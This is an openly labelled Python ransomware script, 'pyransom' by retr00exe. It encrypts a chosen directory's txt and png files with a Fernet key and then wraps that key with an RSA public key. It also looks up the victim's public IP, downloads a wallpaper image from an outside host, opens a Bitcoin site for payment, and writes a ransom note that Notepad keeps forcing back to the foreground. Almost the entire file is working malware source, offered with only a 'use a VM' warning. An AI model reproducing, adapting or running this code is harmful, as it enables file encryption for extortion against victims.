import os
import time
import urllib.request
import datetime
import ctypes
import requests
import webbrowser
import subprocess
import win32gui
import threading
from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


class Ransomware:
    exts = ['txt', 'png']

    def __init__(self, targetDir=f"{os.path.expanduser('~')}Desktop"):
        self.ransomKey = None
        self.crypter = None
        self.publicKey = None
        self.homeDir = os.path.expanduser('~')
        self.targerDir = targetDir
        self.publicIP = requests.get('https://api.ipify.org').text

    def gen_ransom_key(self):
        self.ransomKey = Fernet.generate_key()
        self.crypter = Fernet(self.ransomKey)

    def write_ransom_key(self):
        with open('key.txt', 'wb') as f:
            f.write(self.ransomKey)

    def encrypt_ransom_key(self):
        with open('key.txt', 'rb') as f:
            ransomKey = f.read()
        with open('key.txt', 'wb') as f:
            self.publicKey = RSA.import_key(open('public.pem').read())
            publicEncryptor = PKCS1_OAEP.new(self.publicKey)
            encryptedRansomKey = publicEncryptor.encrypt(ransomKey)
            f.write(encryptedRansomKey)
        self.ransomKey = encryptedRansomKey
        self.crypter = None

    def encrypt_file(self, path, encrypted=False):
        with open(path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(path, 'wb') as f:
            f.write(_data)

    def encrypt_system(self, encrypted=False):
        system = os.walk(self.targerDir, topdown=True)
        for root, _, files in system:
            for file in files:
                path = os.path.join(root, file)
                if not file.split('.')[-1] in self.exts:
                    continue
                if not encrypted:
                    self.encrypt_file(path)
                else:
                    self.encrypt_file(path, encrypted=True)

    @staticmethod
    def how_to_pay():
        url = 'https://bitcoin.org'
        webbrowser.open(url)

    def change_desktop_background(self):
        imageURL = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        path = f'{self.homeDir}\\OneDrive\\Desktop'
        urllib.request.urlretrieve(imageURL, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(
            SPI_SETDESKWALLPAPER, 0, path, 0)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('README.txt', 'w') as f:
            f.write(f'''
            The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
            There is no way to restore your data without a special key. Only we can decrypt your files! \n Date ecnrypted : {date} \n IP Adress {self.publicIP}: 
            ''')

    @staticmethod
    def show_ransom_note():
        ransom = subprocess.Popen(['notepad.exe', 'README.txt'])
        while True:
            time.sleep(0.1)
            title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if title == 'README - Notepad':
                pass
            else:
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'README.txt'])
            time.sleep(5)


def welcome_msg():
    welcome = '''
 _______                                                                           
/       \                                                                          
$$$$$$$  | __    __   ______   ______   _______    _______   ______   _____  ____  
$$ |__$$ |/  |  /  | /      \ /      \ /       \  /       | /      \ /     \/    \ 
$$    $$/ $$ |  $$ |/$$$$$$  |$$$$$$  |$$$$$$$  |/$$$$$$$/ /$$$$$$  |$$$$$$ $$$$  |
$$$$$$$/  $$ |  $$ |$$ |  $$/ /    $$ |$$ |  $$ |$$      \ $$ |  $$ |$$ | $$ | $$ |
$$ |      $$ \__$$ |$$ |     /$$$$$$$ |$$ |  $$ | $$$$$$  |$$ \__$$ |$$ | $$ | $$ |
$$ |      $$    $$ |$$ |     $$    $$ |$$ |  $$ |/     $$/ $$    $$/ $$ | $$ | $$ |
$$/        $$$$$$$ |$$/       $$$$$$$/ $$/   $$/ $$$$$$$/   $$$$$$/  $$/  $$/  $$/ 
          / \__ $$ |                                                               
          $$    $$/                                                                
           $$$$$$/                                              v1.0.0 by retr00exe

Warning : This is real ransomware script. Using VM is highly recommended to avoid unexpected damage.
'''
    print(welcome)


def main():

    welcome_msg()
    targetDir = input("Enter target directory : ")
    pyransom = Ransomware(targetDir)
    pyransom.gen_ransom_key()
    pyransom.encrypt_system()
    pyransom.write_ransom_key()
    pyransom.encrypt_ransom_key()
    pyransom.change_desktop_background()
    pyransom.how_to_pay()
    pyransom.ransom_note()
    t1 = threading.Thread(target=pyransom.show_ransom_note())
    t1.start()


if __name__ == "__main__":
    main()
